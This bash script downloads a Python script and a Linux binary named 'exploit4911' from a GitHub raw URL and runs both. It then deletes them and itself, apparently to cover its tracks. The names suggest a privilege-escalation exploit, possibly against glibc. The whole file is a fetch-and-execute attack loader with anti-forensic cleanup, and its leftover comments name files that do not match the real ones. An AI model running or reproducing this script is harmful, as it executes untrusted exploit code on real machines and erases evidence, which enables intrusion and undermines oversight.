#!/bin/bash
# Define URLs for the files
PYTHON_SCRIPT_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/genlib.py"
BINARY_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/exploit4911"

# Download test.py using wget
#echo "Downloading test.py..."
wget $PYTHON_SCRIPT_URL -nv

# Download program1 (Linux x86_64 binary) using wget
#echo "Downloading program1..."
wget $BINARY_URL -nv

# Make program1 executable
#echo "Making program1 executable..."
chmod +x exploit4911

# Run the Python script (test.py)
#echo "Running test.py..."
python3 genlib.py

# Run the Linux binary (program1)
#echo "Running program1..."
./exploit4911

rm -rf '"'
rm ./genlib.py
rm ./exploit4911
rm -- "$0"